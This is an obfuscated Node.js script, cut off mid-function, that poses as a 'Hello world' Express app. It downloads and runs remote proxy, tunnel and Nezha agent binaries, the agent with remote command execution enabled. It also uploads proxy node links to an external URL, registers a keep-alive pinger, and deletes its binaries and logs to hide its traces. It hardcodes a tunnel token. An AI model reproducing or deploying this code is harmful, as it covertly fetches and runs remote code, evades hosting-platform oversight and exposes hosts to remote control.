const _0x36ddab=_0x5eee;(function(_0x2ca003,_0x1aee2e){const _0x3a7dca=_0x5eee,_0x532a1d=_0x2ca003();while(!![]){try{const _0x5cd3a8=parseInt(_0x3a7dca(0x1e8))/0x1*(-parseInt(_0x3a7dca(0x223))/0x2)+parseInt(_0x3a7dca(0x265))/0x3*(parseInt(_0x3a7dca(0x262))/0x4)+parseInt(_0x3a7dca(0x24f))/0x5*(-parseInt(_0x3a7dca(0x1e7))/0x6)+parseInt(_0x3a7dca(0x277))/0x7*(parseInt(_0x3a7dca(0x25b))/0x8)+parseInt(_0x3a7dca(0x202))/0x9+-parseInt(_0x3a7dca(0x227))/0xa*(-parseInt(_0x3a7dca(0x264))/0xb)+-parseInt(_0x3a7dca(0x22f))/0xc*(parseInt(_0x3a7dca(0x1c9))/0xd);if(_0x5cd3a8===_0x1aee2e)break;else _0x532a1d['push'](_0x532a1d['shift']());}catch(_0x4e9c45){_0x532a1d['push'](_0x532a1d['shift']());}}}(_0x407a,0x1f436));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x36ddab(0x209)),{promisify}=require(_0x36ddab(0x1c3)),exec=promisify(require('child_process')[_0x36ddab(0x1f6)]),{execSync}=require(_0x36ddab(0x1bf)),UPLOAD_URL=process[_0x36ddab(0x211)][_0x36ddab(0x23d)]||'',PROJECT_URL=process['env'][_0x36ddab(0x249)]||'',AUTO_ACCESS=process['env'][_0x36ddab(0x1e3)]||![],FILE_PATH=process[_0x36ddab(0x211)][_0x36ddab(0x1c5)]||_0x36ddab(0x20d),SUB_PATH=process['env'][_0x36ddab(0x23f)]||_0x36ddab(0x1ea),PORT=process[_0x36ddab(0x211)][_0x36ddab(0x1b8)]||process[_0x36ddab(0x211)]['PORT']||0xbb8,UUID=process[_0x36ddab(0x211)][_0x36ddab(0x234)]||_0x36ddab(0x23a),NEZHA_SERVER=process[_0x36ddab(0x211)][_0x36ddab(0x259)]||'',NEZHA_PORT=process['env'][_0x36ddab(0x1e4)]||'',NEZHA_KEY=process[_0x36ddab(0x211)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x36ddab(0x211)][_0x36ddab(0x203)]||'afvideo.820575.xyz',ARGO_AUTH=process[_0x36ddab(0x211)][_0x36ddab(0x219)]||_0x36ddab(0x1c4),ARGO_PORT=process[_0x36ddab(0x211)][_0x36ddab(0x1c6)]||0x1f41,CFIP=process[_0x36ddab(0x211)][_0x36ddab(0x1f7)]||_0x36ddab(0x218),CFPORT=process[_0x36ddab(0x211)][_0x36ddab(0x22b)]||0x1bb,NAME=process[_0x36ddab(0x211)][_0x36ddab(0x207)]||_0x36ddab(0x21e);!fs[_0x36ddab(0x1d2)](FILE_PATH)?(fs[_0x36ddab(0x244)](FILE_PATH),console[_0x36ddab(0x1db)](FILE_PATH+_0x36ddab(0x226))):console['log'](FILE_PATH+_0x36ddab(0x1ce));function generateRandomName(){const _0xc13b9a=_0x36ddab,_0x1c5fa3=_0xc13b9a(0x1cd);let _0x1efb2e='';for(let _0x108fc5=0x0;_0x108fc5<0x6;_0x108fc5++){_0x1efb2e+=_0x1c5fa3['charAt'](Math[_0xc13b9a(0x1be)](Math[_0xc13b9a(0x204)]()*_0x1c5fa3[_0xc13b9a(0x1b4)]));}return _0x1efb2e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x36ddab(0x26d)](FILE_PATH,npmName),phpPath=path[_0x36ddab(0x26d)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x36ddab(0x26d)](FILE_PATH,_0x36ddab(0x215)),listPath=path[_0x36ddab(0x26d)](FILE_PATH,_0x36ddab(0x27a)),bootLogPath=path[_0x36ddab(0x26d)](FILE_PATH,_0x36ddab(0x216)),configPath=path[_0x36ddab(0x26d)](FILE_PATH,'config.json');function deleteNodes(){const _0x2a84e4=_0x36ddab;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x311170;try{_0x311170=fs[_0x2a84e4(0x20c)](subPath,_0x2a84e4(0x1fd));}catch{return null;}const _0x450261=Buffer[_0x2a84e4(0x267)](_0x311170,_0x2a84e4(0x25f))[_0x2a84e4(0x208)]('utf-8'),_0x8f85f2=_0x450261[_0x2a84e4(0x25a)]('\x0a')[_0x2a84e4(0x1e6)](_0x235350=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x235350));if(_0x8f85f2[_0x2a84e4(0x1b4)]===0x0)return;return axios[_0x2a84e4(0x1ed)](UPLOAD_URL+_0x2a84e4(0x20f),JSON[_0x2a84e4(0x1f3)]({'nodes':_0x8f85f2}),{'headers':{'Content-Type':_0x2a84e4(0x1f9)}})['catch'](_0x26a7a3=>{return null;}),null;}catch(_0x256e8e){return null;}}function cleanupOldFiles(){const _0x5b6f1b=_0x36ddab;try{const _0x2ec54b=fs[_0x5b6f1b(0x258)](FILE_PATH);_0x2ec54b[_0x5b6f1b(0x220)](_0x1e9534=>{const _0x24cdf0=_0x5b6f1b,_0x3260b6=path[_0x24cdf0(0x26d)](FILE_PATH,_0x1e9534);try{const _0x4f214d=fs[_0x24cdf0(0x1cc)](_0x3260b6);_0x4f214d['isFile']()&&fs[_0x24cdf0(0x228)](_0x3260b6);}catch(_0x9ed616){}});}catch(_0x434c75){}}app[_0x36ddab(0x1ec)]('/',function(_0x5e17f6,_0x2564ea){const _0x241028=_0x36ddab;_0x2564ea[_0x241028(0x1f1)]('Hello\x20world!');});async function generateConfig(){const _0x3b49c0=_0x36ddab,_0x30d61d={'log':{'access':_0x3b49c0(0x250),'error':_0x3b49c0(0x250),'loglevel':_0x3b49c0(0x273)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3b49c0(0x1bd),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x3b49c0(0x273),'fallbacks':[{'dest':0xbb9},{'path':_0x3b49c0(0x26c),'dest':0xbba},{'path':_0x3b49c0(0x266),'dest':0xbbb},{'path':_0x3b49c0(0x20a),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x3b49c0(0x235),'protocol':_0x3b49c0(0x1bd),'settings':{'clients':[{'id':UUID}],'decryption':_0x3b49c0(0x273)},'streamSettings':{'network':_0x3b49c0(0x242),'security':_0x3b49c0(0x273)}},{'port':0xbba,'listen':_0x3b49c0(0x235),'protocol':_0x3b49c0(0x1bd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3b49c0(0x273)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3b49c0(0x27b),_0x3b49c0(0x272),_0x3b49c0(0x1da)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3b49c0(0x1fa),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3b49c0(0x266)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b49c0(0x27b),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3b49c0(0x235),'protocol':_0x3b49c0(0x1d6),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3b49c0(0x20a)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b49c0(0x27b),_0x3b49c0(0x272),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x3b49c0(0x260),'tag':_0x3b49c0(0x270)},{'protocol':'blackhole','tag':'block'}]};fs['writeFileSync'](path[_0x3b49c0(0x26d)](FILE_PATH,'config.json'),JSON['stringify'](_0x30d61d,null,0x2));}function _0x407a(){const _0x2ea2a5=['unlink','Error\x20executing\x20command:\x20','createWriteStream','SERVER_PORT','https://arm64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&fp=firefox&type=ws&host=','win32','vless','floor','child_process','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','taskkill\x20/f\x20/im\x20','all','util','eyJhIjoiMmJmY2FiYTdhODc2YzczZmQ5MjRkMzAzYmU1NDEyZGMiLCJ0IjoiNDkzODAzMzUtNDNkYi00MjY0LWE2ZTQtM2ExOGUxYmM2OGYyIiwicyI6IlpHVmlNbVV4TW1FdE5HVmxNUzAwTW1JMkxXRXpNR1l0T1RGbE1ERTVaR1F4WmpFeiJ9','FILE_PATH','ARGO_PORT','\x0a\x0avmess://','unshift','328133RkaKSH','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://arm64.ssss.nyc.mn/bot','statSync','abcdefghijklmnopqrstuvwxyz','\x20already\x20exists','?security=tls&sni=','pop','basename','existsSync','2053','data','nohup\x20','trojan','Download\x20','Unknown','https://amd64.ssss.nyc.mn/agent','quic','log','\x20failed:\x20','https://arm64.ssss.nyc.mn/web','https://arm64.ssss.nyc.mn/agent','writeFileSync','?encryption=none&security=tls&sni=','true','2096','AUTO_ACCESS','NEZHA_PORT','includes','filter','688080gFsRjv','2MGpkVs','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','1029','arm','get','post','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','2083','match','send','test','stringify','Empowerment\x20success\x20for\x20','Error\x20downloading\x20files:','exec','CFIP','web\x20running\x20error:\x20','application/json','vmess','fileName','\x20is\x20running','utf-8','close','then','countryCode','has','1389870aDArsU','ARGO_DOMAIN','random','https://oooo.serv00.net/add-url','\x22\x20>\x20/dev/null\x202>&1','NAME','toString','path','/trojan-argo','\x20>/dev/null\x202>&1','readFileSync','./tmp','/config.json\x20>/dev/null\x202>&1\x20&','/api/delete-nodes','pkill\x20-f\x20\x22[','env','message','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','https://amd64.ssss.nyc.mn/v1','sub.txt','boot.log','npm\x20running\x20error:\x20','cdns.doon.eu.org','ARGO_AUTH','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Unhandled\x20error\x20in\x20startserver:','country_code','automatic\x20access\x20task\x20added\x20successfully','video','Content-Type','forEach','Empowerment\x20failed\x20for\x20','ArgoDomain:','60962uTJIhY','aarch64','set','\x20is\x20created','13460nUUadK','unlinkSync','arch','tunnel.json','CFPORT','listen','Nodes\x20uploaded\x20successfully','\x0a\x20\x20tunnel:\x20','36xENzpH','\x0a\x20\x20\x20\x20','2087','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','UUID','127.0.0.1','firefox','platform','\x20-c\x20','\x0aclient_secret:\x20','5e42ea58-5eff-467f-a700-49c7b5cfdfe4','success','catch','UPLOAD_URL','text/plain;\x20charset=utf-8','SUB_PATH','443','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','tcp','status','mkdirSync','amd','response','https://amd64.ssss.nyc.mn/web','fileUrl','PROJECT_URL','Subscription\x20uploaded\x20successfully','http\x20server\x20is\x20running\x20on\x20port:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20-c\x20\x22','10TzMaNk','/dev/null','/vmess-argo?ed=2560','rm\x20-rf\x20','\x20-s\x20','\x20-p\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20successfully','readdirSync','NEZHA_SERVER','split','8uGeHxS','\x20>/dev/null\x202>&1\x20&','.exe\x20>\x20nul\x202>&1','error','base64','freedom','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','128028mntRez','\x20>\x20nul\x202>&1','1001rGtbww','9SyZHNc','/vmess-argo','from','finish','push','\x0a\x20\x20credentials-file:\x20','clear','/vless-argo','join','https://amd64.ssss.nyc.mn/bot','--tls','direct','/sub.txt\x20saved\x20successfully','tls','none','8443','stream','/tunnel.yml\x20run','848134ffzkYt','http://ip-api.com/json/','org','list.txt','http','charAt','length'];_0x407a=function(){return _0x2ea2a5;};return _0x407a();}function getSystemArchitecture(){const _0x434cbe=_0x36ddab,_0x809220=os[_0x434cbe(0x229)]();return _0x809220===_0x434cbe(0x1eb)||_0x809220==='arm64'||_0x809220===_0x434cbe(0x224)?_0x434cbe(0x1eb):_0x434cbe(0x245);}function downloadFile(_0x26d7e5,_0x3b1553,_0x5403c4){const _0x58f473=_0x36ddab,_0x1ef1d5=_0x26d7e5;!fs['existsSync'](FILE_PATH)&&fs[_0x58f473(0x244)](FILE_PATH,{'recursive':!![]});const _0x2c5a1f=fs[_0x58f473(0x1b7)](_0x1ef1d5);axios({'method':'get','url':_0x3b1553,'responseType':_0x58f473(0x275)})[_0x58f473(0x1ff)](_0x4206c5=>{const _0x31d513=_0x58f473;_0x4206c5[_0x31d513(0x1d4)]['pipe'](_0x2c5a1f),_0x2c5a1f['on'](_0x31d513(0x268),()=>{const _0x137071=_0x31d513;_0x2c5a1f[_0x137071(0x1fe)](),console[_0x137071(0x1db)](_0x137071(0x1d7)+path[_0x137071(0x1d1)](_0x1ef1d5)+_0x137071(0x257)),_0x5403c4(null,_0x1ef1d5);}),_0x2c5a1f['on'](_0x31d513(0x25e),_0x5b632f=>{const _0x4ad4f2=_0x31d513;fs[_0x4ad4f2(0x1b5)](_0x1ef1d5,()=>{});const _0x1245b2=_0x4ad4f2(0x1d7)+path[_0x4ad4f2(0x1d1)](_0x1ef1d5)+'\x20failed:\x20'+_0x5b632f[_0x4ad4f2(0x212)];console[_0x4ad4f2(0x25e)](_0x1245b2),_0x5403c4(_0x1245b2);});})[_0x58f473(0x23c)](_0x51a52f=>{const _0x553157=_0x58f473,_0x470d9d='Download\x20'+path[_0x553157(0x1d1)](_0x1ef1d5)+_0x553157(0x1dc)+_0x51a52f[_0x553157(0x212)];console[_0x553157(0x25e)](_0x470d9d),_0x5403c4(_0x470d9d);});}async function downloadFilesAndRun(){const _0x14723d=_0x36ddab,_0x2471c4=getSystemArchitecture(),_0x4a82fd=getFilesForArchitecture(_0x2471c4);if(_0x4a82fd[_0x14723d(0x1b4)]===0x0){console['log'](_0x14723d(0x232));return;}const _0x561ada=_0x4a82fd['map'](_0x403ec0=>{return new Promise((_0x395e1c,_0x2894b1)=>{const _0xc9e9a6=_0x5eee;downloadFile(_0x403ec0[_0xc9e9a6(0x1fb)],_0x403ec0[_0xc9e9a6(0x248)],(_0x454bab,_0x3831c3)=>{_0x454bab?_0x2894b1(_0x454bab):_0x395e1c(_0x3831c3);});});});try{await Promise[_0x14723d(0x1c2)](_0x561ada);}catch(_0x1bb5af){console[_0x14723d(0x25e)](_0x14723d(0x1f5),_0x1bb5af);return;}function _0x24398e(_0x367d48){const _0x19d635=_0x14723d,_0x3adcc8=0x1fd;_0x367d48[_0x19d635(0x220)](_0x33a12d=>{const _0x3fc3d5=_0x19d635;fs[_0x3fc3d5(0x1d2)](_0x33a12d)&&fs['chmod'](_0x33a12d,_0x3adcc8,_0x21e4bd=>{const _0x3aaa4b=_0x3fc3d5;_0x21e4bd?console[_0x3aaa4b(0x25e)](_0x3aaa4b(0x221)+_0x33a12d+':\x20'+_0x21e4bd):console[_0x3aaa4b(0x1db)](_0x3aaa4b(0x1f4)+_0x33a12d+':\x20'+_0x3adcc8[_0x3aaa4b(0x208)](0x8));});});}const _0x5c018f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x24398e(_0x5c018f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x305248=NEZHA_SERVER[_0x14723d(0x1e5)](':')?NEZHA_SERVER[_0x14723d(0x25a)](':')[_0x14723d(0x1d0)]():'',_0xef3b8f=new Set([_0x14723d(0x240),'8443',_0x14723d(0x1e2),_0x14723d(0x231),_0x14723d(0x1ef),_0x14723d(0x1d3)]),_0x30cbcc=_0xef3b8f[_0x14723d(0x201)](_0x305248)?_0x14723d(0x1e1):'false',_0x406d01=_0x14723d(0x239)+NEZHA_KEY+_0x14723d(0x256)+NEZHA_SERVER+_0x14723d(0x241)+_0x30cbcc+_0x14723d(0x1ba)+UUID;fs[_0x14723d(0x1df)](path[_0x14723d(0x26d)](FILE_PATH,'config.yaml'),_0x406d01);const _0x3a8154=_0x14723d(0x1d5)+phpPath+_0x14723d(0x24e)+FILE_PATH+_0x14723d(0x233);try{await exec(_0x3a8154),console[_0x14723d(0x1db)](phpName+_0x14723d(0x1fc)),await new Promise(_0x2214f3=>setTimeout(_0x2214f3,0x3e8));}catch(_0x597eb6){console[_0x14723d(0x25e)]('php\x20running\x20error:\x20'+_0x597eb6);}}else{let _0x2db66d='';const _0x5696d3=['443',_0x14723d(0x274),'2096',_0x14723d(0x231),_0x14723d(0x1ef),_0x14723d(0x1d3)];_0x5696d3['includes'](NEZHA_PORT)&&(_0x2db66d=_0x14723d(0x26f));const _0x16894a=_0x14723d(0x1d5)+npmPath+_0x14723d(0x253)+NEZHA_SERVER+':'+NEZHA_PORT+_0x14723d(0x254)+NEZHA_KEY+'\x20'+_0x2db66d+_0x14723d(0x24c);try{await exec(_0x16894a),console[_0x14723d(0x1db)](npmName+_0x14723d(0x1fc)),await new Promise(_0x5ce462=>setTimeout(_0x5ce462,0x3e8));}catch(_0x94a9ad){console[_0x14723d(0x25e)](_0x14723d(0x217)+_0x94a9ad);}}}else console[_0x14723d(0x1db)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3e8ea8=_0x14723d(0x1d5)+webPath+_0x14723d(0x238)+FILE_PATH+_0x14723d(0x20e);try{await exec(_0x3e8ea8),console[_0x14723d(0x1db)](webName+_0x14723d(0x1fc)),await new Promise(_0x3ff2da=>setTimeout(_0x3ff2da,0x3e8));}catch(_0x15a728){console['error'](_0x14723d(0x1f8)+_0x15a728);}if(fs['existsSync'](botPath)){let _0x606b85;if(ARGO_AUTH[_0x14723d(0x1f0)](/^[A-Z0-9a-z=]{120,250}$/))_0x606b85='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x606b85=_0x14723d(0x1ee)+FILE_PATH+_0x14723d(0x276):_0x606b85=_0x14723d(0x255)+FILE_PATH+_0x14723d(0x21a)+ARGO_PORT;try{await exec(_0x14723d(0x1d5)+botPath+'\x20'+_0x606b85+_0x14723d(0x25c)),console[_0x14723d(0x1db)](botName+_0x14723d(0x1fc)),await new Promise(_0x466e5e=>setTimeout(_0x466e5e,0x7d0));}catch(_0x2c1d6a){console[_0x14723d(0x25e)](_0x14723d(0x1b6)+_0x2c1d6a);}}await new Promise(_0x1c6de7=>setTimeout(_0x1c6de7,0x1388));}function getFilesForArchitecture(_0x30bc2f){const _0x211313=_0x36ddab;let _0x12c944;_0x30bc2f===_0x211313(0x1eb)?_0x12c944=[{'fileName':webPath,'fileUrl':_0x211313(0x1dd)},{'fileName':botPath,'fileUrl':_0x211313(0x1cb)}]:_0x12c944=[{'fileName':webPath,'fileUrl':_0x211313(0x247)},{'fileName':botPath,'fileUrl':_0x211313(0x26e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xce8f9e=_0x30bc2f==='arm'?_0x211313(0x1de):_0x211313(0x1d9);_0x12c944['unshift']({'fileName':npmPath,'fileUrl':_0xce8f9e});}else{const _0xff692a=_0x30bc2f===_0x211313(0x1eb)?_0x211313(0x1b9):_0x211313(0x214);_0x12c944[_0x211313(0x1c8)]({'fileName':phpPath,'fileUrl':_0xff692a});}}return _0x12c944;}function _0x5eee(_0x96ee63,_0x7013d7){_0x96ee63=_0x96ee63-0x1b4;const _0x407a58=_0x407a();let _0x5eee86=_0x407a58[_0x96ee63];return _0x5eee86;}function argoType(){const _0x456ca9=_0x36ddab;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x456ca9(0x213));return;}if(ARGO_AUTH[_0x456ca9(0x1e5)]('TunnelSecret')){fs[_0x456ca9(0x1df)](path[_0x456ca9(0x26d)](FILE_PATH,_0x456ca9(0x22a)),ARGO_AUTH);const _0x418854=_0x456ca9(0x22e)+ARGO_AUTH[_0x456ca9(0x25a)]('\x22')[0xb]+_0x456ca9(0x26a)+path[_0x456ca9(0x26d)](FILE_PATH,_0x456ca9(0x22a))+_0x456ca9(0x1c0)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x456ca9(0x24d);fs[_0x456ca9(0x1df)](path[_0x456ca9(0x26d)](FILE_PATH,'tunnel.yml'),_0x418854);}else console['log'](_0x456ca9(0x1e9));}async function extractDomains(){const _0x3941d0=_0x36ddab;let _0x3b0dcc;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3b0dcc=ARGO_DOMAIN,console[_0x3941d0(0x1db)]('ARGO_DOMAIN:',_0x3b0dcc),await _0x5ebc0e(_0x3b0dcc);else try{const _0x4976bb=fs[_0x3941d0(0x20c)](path[_0x3941d0(0x26d)](FILE_PATH,_0x3941d0(0x216)),_0x3941d0(0x1fd)),_0x58f273=_0x4976bb['split']('\x0a'),_0xbc226a=[];_0x58f273[_0x3941d0(0x220)](_0x4b5ecd=>{const _0x36d7ce=_0x3941d0,_0x43f65b=_0x4b5ecd[_0x36d7ce(0x1f0)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x43f65b){const _0x76dbc5=_0x43f65b[0x1];_0xbc226a[_0x36d7ce(0x269)](_0x76dbc5);}});if(_0xbc226a[_0x3941d0(0x1b4)]>0x0)_0x3b0dcc=_0xbc226a[0x0],console[_0x3941d0(0x1db)](_0x3941d0(0x222),_0x3b0dcc),await _0x5ebc0e(_0x3b0dcc);else{console[_0x3941d0(0x1db)](_0x3941d0(0x261)),fs[_0x3941d0(0x228)](path[_0x3941d0(0x26d)](FILE_PATH,_0x3941d0(0x216)));async function _0x4a9edb(){const _0x4a4851=_0x3941d0;try{process['platform']==='win32'?await exec(_0x4a4851(0x1c1)+botName+_0x4a4851(0x25d)):await exec(_0x4a4851(0x210)+botName[_0x4a4851(0x27c)](0x0)+']'+botName['substring'](0x1)+_0x4a4851(0x206));}catch(_0x125c89){}}_0x4a9edb(),await new Promise(_0x16f07d=>setTimeout(_0x16f07d,0xbb8));const _0xa84fdf='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3941d0(0x21a)+ARGO_PORT;try{await exec(_0x3941d0(0x1d5)+botPath+'\x20'+_0xa84fdf+'\x20>/dev/null\x202>&1\x20&'),console[_0x3941d0(0x1db)](botName+_0x3941d0(0x1fc)),await new Promise(_0x4b1411=>setTimeout(_0x4b1411,0xbb8)),await extractDomains();}catch(_0x51c758){console[_0x3941d0(0x25e)](_0x3941d0(0x1b6)+_0x51c758);}}}catch(_0x4935de){console[_0x3941d0(0x25e)]('Error\x20reading\x20boot.log:',_0x4935de);}async function _0x577b81(){const _0x3d765d=_0x3941d0;try{const _0x2aae12=await axios[_0x3d765d(0x1ec)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x2aae12[_0x3d765d(0x1d4)]&&_0x2aae12[_0x3d765d(0x1d4)][_0x3d765d(0x21c)]&&_0x2aae12['data']['org'])return _0x2aae12[_0x3d765d(0x1d4)][_0x3d765d(0x21c)]+'_'+_0x2aae12[_0x3d765d(0x1d4)][_0x3d765d(0x279)];}catch(_0x3ec815){try{const _0x525bb4=await axios[_0x3d765d(0x1ec)](_0x3d765d(0x278),{'timeout':0xbb8});if(_0x525bb4[_0x3d765d(0x1d4)]&&_0x525bb4['data'][_0x3d765d(0x243)]===_0x3d765d(0x23b)&&_0x525bb4[_0x3d765d(0x1d4)][_0x3d765d(0x200)]&&_0x525bb4['data']['org'])return _0x525bb4[_0x3d765d(0x1d4)][_0x3d765d(0x200)]+'_'+_0x525bb4[_0x3d765d(0x1d4)][_0x3d765d(0x279)];}catch(_0x2c4762){}}return _0x3d765d(0x1d8);}async function _0x5ebc0e(_0x12d932){const _0x250a35=await _0x577b81(),_0x3adb47=NAME?NAME+'-'+_0x250a35:_0x250a35;return new Promise(_0x386cf3=>{setTimeout(()=>{const _0x587fec=_0x5eee,_0x23929d={'v':'2','ps':''+_0x3adb47,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x587fec(0x273),'host':_0x12d932,'path':_0x587fec(0x251),'tls':_0x587fec(0x272),'sni':_0x12d932,'alpn':'','fp':_0x587fec(0x236)},_0x1b0a65='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x587fec(0x1e0)+_0x12d932+_0x587fec(0x1bb)+_0x12d932+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3adb47+_0x587fec(0x1c7)+Buffer[_0x587fec(0x267)](JSON[_0x587fec(0x1f3)](_0x23929d))[_0x587fec(0x208)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x587fec(0x1cf)+_0x12d932+'&fp=firefox&type=ws&host='+_0x12d932+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3adb47+_0x587fec(0x230);console[_0x587fec(0x1db)](Buffer[_0x587fec(0x267)](_0x1b0a65)['toString'](_0x587fec(0x25f))),fs[_0x587fec(0x1df)](subPath,Buffer[_0x587fec(0x267)](_0x1b0a65)[_0x587fec(0x208)](_0x587fec(0x25f))),console[_0x587fec(0x1db)](FILE_PATH+_0x587fec(0x271)),uploadNodes(),app[_0x587fec(0x1ec)]('/'+SUB_PATH,(_0x143448,_0x2e7500)=>{const _0x507ed7=_0x587fec,_0x3910c8=Buffer['from'](_0x1b0a65)['toString'](_0x507ed7(0x25f));_0x2e7500[_0x507ed7(0x225)](_0x507ed7(0x21f),_0x507ed7(0x23e)),_0x2e7500['send'](_0x3910c8);}),_0x386cf3(_0x1b0a65);},0x7d0);});}}async function uploadNodes(){const _0x38bd45=_0x36ddab;if(UPLOAD_URL&&PROJECT_URL){const _0x150bb8=PROJECT_URL+'/'+SUB_PATH,_0x399700={'subscription':[_0x150bb8]};try{const _0x5a77fb=await axios[_0x38bd45(0x1ed)](UPLOAD_URL+'/api/add-subscriptions',_0x399700,{'headers':{'Content-Type':'application/json'}});return _0x5a77fb&&_0x5a77fb[_0x38bd45(0x243)]===0xc8?(console[_0x38bd45(0x1db)](_0x38bd45(0x24a)),_0x5a77fb):null;}catch(_0x5b0ed8){if(_0x5b0ed8[_0x38bd45(0x246)]){if(_0x5b0ed8[_0x38bd45(0x246)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x38bd45(0x1d2)](listPath))return;const _0x1b46e0=fs[_0x38bd45(0x20c)](listPath,_0x38bd45(0x1fd)),_0xda7cba=_0x1b46e0[_0x38bd45(0x25a)]('\x0a')[_0x38bd45(0x1e6)](_0x507f85=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x38bd45(0x1f2)](_0x507f85));if(_0xda7cba['length']===0x0)return;const _0x5016d6=JSON[_0x38bd45(0x1f3)]({'nodes':_0xda7cba});try{const _0x4510ef=await axios[_0x38bd45(0x1ed)](UPLOAD_URL+'/api/add-nodes',_0x5016d6,{'headers':{'Content-Type':_0x38bd45(0x1f9)}});return _0x4510ef&&_0x4510ef[_0x38bd45(0x243)]===0xc8?(console[_0x38bd45(0x1db)](_0x38bd45(0x22d)),_0x4510ef):null;}catch(_0x4539fd){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x22fea8=_0x5eee,_0x1c5d0c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1c5d0c['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1c5d0c[_0x22fea8(0x269)](phpPath);process[_0x22fea8(0x237)]===_0x22fea8(0x1bc)?exec('del\x20/f\x20/q\x20'+_0x1c5d0c[_0x22fea8(0x26d)]('\x20')+_0x22fea8(0x263),_0x3e2222=>{const _0x326e35=_0x22fea8;console[_0x326e35(0x26b)](),console['log']('App\x20is\x20running'),console['log'](_0x326e35(0x1ca));}):exec(_0x22fea8(0x252)+_0x1c5d0c['join']('\x20')+_0x22fea8(0x20b),_0x63056d=>{const _0x483254=_0x22fea8;console[_0x483254(0x26b)](),console['log']('App\x20is\x20running'),console[_0x483254(0x1db)](_0x483254(0x1ca));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1190cd=_0x36ddab;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1190cd(0x1db)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x5b33c0=await axios[_0x1190cd(0x1ed)](_0x1190cd(0x205),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1190cd(0x1f9)}});return 